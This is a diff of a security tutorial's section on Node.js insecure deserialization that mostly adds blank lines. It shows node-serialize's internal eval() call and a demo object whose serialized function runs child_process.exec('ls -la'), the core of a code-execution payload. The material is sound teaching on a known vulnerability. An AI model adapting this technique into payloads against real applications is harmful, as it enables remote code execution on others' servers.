@@ -821,11 +821,14 @@ Let's take an another lab example for Java Insecure Deserialization. We can acce
 
 ### Deserialization on Node JS
 - Serialization is usually performed on Node JS using a module called [node-serialize.](https://www.npmjs.com/package/node-serialize). This module contains an **eval()** function and can be exploited if the data passed is not validated properly. If we view the source code of the module **node-serialize**, we can find that it contains **eval()** functions on line 76 as shown below.
+
 ```js
 if(obj[key].indexOf(FUNCFLAG) === 0) {
     obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');
 ```
+
 - Before its exploitation, let's talk about how serialization works on Node JS. We need to install the module **node-serialize** for it using `npm install node-serialize` command.
+
 ```js
 var nodeSerialize = require("node-serialize")
 
@@ -839,14 +842,18 @@ var obj = {
 var objS = nodeSerialize.serialize(obj);
 console.log(objS)
 ```
+
 - Run the code using `node` command
+
 ```bash
 node nodedemo.js 
 {"name":"Bob","say":"_$$ND_FUNC$$_function() {\n    return 'hi ' + this.name;\n  }"}
 ```
+
 - In the above code, **obj** object has two properties: **name**, which is set to the string **Bob**, and **say**, which is a function that returns the string **hi** followed by the value of the **name** property. The **node-serialize** library is then used to serialize the **obj** object.
 - How this can be vulnerable?
 - Let's copy the same code and make some changes here.
+
 ```js
 var nodeSerialize = require("node-serialize")
 
@@ -860,6 +867,7 @@ require('child_process').exec('ls -la', function(error, stdout, stderr) { consol
 var objS = nodeSerialize.serialize(obj);
 console.log(objS)
 ```
+
 - Here, I just told an application to execute the system commands and list down the files and folders within the directory, since the module **node-serialize** uses **eval()** function within it, it should execute the command.
 
 ```bash
